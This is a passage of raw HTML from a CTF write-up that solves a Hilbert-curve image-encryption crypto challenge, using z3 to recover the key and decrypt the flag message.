style=\"--0:#E1E4E8\">)))\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"# [0, 0, 2, 0, 0]# [0, 2, 0, 1, 3]# [3, 1, 1, 2, 0]def m0_shift_back(a):  shift = [0, 3, 2, 1, 4]  return [a[s] for s in shift]def solve_key_0(ct_fixed, pt):  print(pt)  print(ct_fixed)  solver = Solver()  vars = [Int(f&#x27;k_{x}&#x27;) for x in range(3)]  k0, k1, k2 = vars  N = 256  solver.add(k0 >= 0, k1 >= 0, k2 >= 0)  solver.add(k0 \u003C 128, k1 \u003C 128, k2 \u003C 128)  solver.add(ct_fixed[0] == (pt[0] + 3*k2) % N)  solver.add(ct_fixed[1] == (pt[1] + k1 + 2*k2) % N)  solver.add(ct_fixed[2] == (pt[2] + 2*k0 + k2) % N)  solver.add(ct_fixed[3] == (pt[3] + 2*k1 + k2) % N)  solver.add(ct_fixed[4] == (pt[4] + 3*k1) % N)  print(solver.check())  assert solver.check() == sat  m = solver.model()  print(m)  print(&#x22;&#x22;.join(chr(m[x].as_long()) for x in reversed(vars)))\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>I had then created the \u003Ccode>shift_back\u003C/code> function, which reverses the order of the message characters to match the order of the original known plaintext flag header. The \u003Ccode>solve_key\u003C/code> function then simply puts those conditions into z3 to find a valid flag.\u003C/p>\n\u003Cp>Each permutation has its own unique \u003Ccode>solve_key\u003C/code> function, which I wrote using z3. I bruteforced this for each permutation, eventually I got a success with permutation \u003Ccode>312\u003C/code> and rotation \u003Ccode>90deg\u003C/code>.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">n \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">gen_hilbert_table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">m \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sox(n, i)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">m[t] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> m\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#99A0A6\"># this takes a bit\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">table \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> gen_hilbert_table\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PIL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Image\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Image.open(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"enc.png\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img.rotate(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">90\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">pix \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img.load()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (x, y), v \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> table.items():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg[v] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pix[x, y][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">l \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">4854\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">14563\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">31553\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">43690\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">55826\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'CCTF{'\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">header \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [_msg[i] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> l]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(header)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> shift_solvers \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> solve_key_4, m4_shift_back\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> solve_key_4(m4_shift_back(header), [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(x) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> msg])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">img.close()\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"n = 256def gen_hilbert_table():  m = {}  for i in range(n**2):    t = sox(n, i)    m[t] = i  return m# this takes a bittable = gen_hilbert_tablefrom PIL import Imageimg = Image.open(&#x22;enc.png&#x22;)img = img.rotate(90)pix = img.load()_msg = [0 for _ in range(n**2)]for (x, y), v in table.items():  _msg[v] = pix[x, y][0]l = [4854, 14563, 31553, 43690, 55826]msg = &#x27;CCTF{&#x27;header = [_msg[i] for i in l]print(header)from shift_solvers import solve_key_4, m4_shift_backs = solve_key_4(m4_shift_back(header), [ord(x) for x in msg])img.close()\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Which finds 2 possible keys,\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">[k_0 = \u003C/span>\u003Cspan style=\"--0:#79B8FF\">89\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k_1 = \u003C/span>\u003Cspan style=\"--0:#79B8FF\">179\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k_2 = \u003C/span>\u003Cspan style=\"--0:#79B8FF\">107\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">k³Y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">[k_0 = \u003C/span>\u003Cspan style=\"--0:#79B8FF\">89\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k_2 = \u003C/span>\u003Cspan style=\"--0:#79B8FF\">107\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, k_1 = \u003C/span>\u003Cspan style=\"--0:#79B8FF\">51\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">k3Y\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"[k_0 = 89, k_1 = 179, k_2 = 107]k³Y[k_0 = 89, k_2 = 107, k_1 = 51]k3Y\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>I assumed the key was the lattter, and now continued to the final state of solving, actually decrypting the message. While it seems doable to work backwards and reverse the encrypted message with the key, I instead just used z3 to have it solve for the entire message. The solver is essentially the same as the \u003Ccode>Bertrand.py\u003C/code> code, but uses a z3 Int array as the initial message. We then put ascii conditions and ensuring that the final created message is the same as the that in the image.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> functools\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">PIL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Image\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> z3 \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">key \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"k3Y\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">n \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sox\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n, d):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y, t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, d\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> s \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">u \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">v \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">^\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> spin(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s, x, y, u, v)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">y \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">s \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> v\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">t \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> t \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x, y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">spin\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n, x, y, u, v):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> v \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> u \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x, y \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y, x\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x, y\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pickle\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">with\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"hilbert.json\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'rb'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">as\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> f:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">table \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pickle.load(f)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">buf \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [Int(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"F_\u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">i\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan 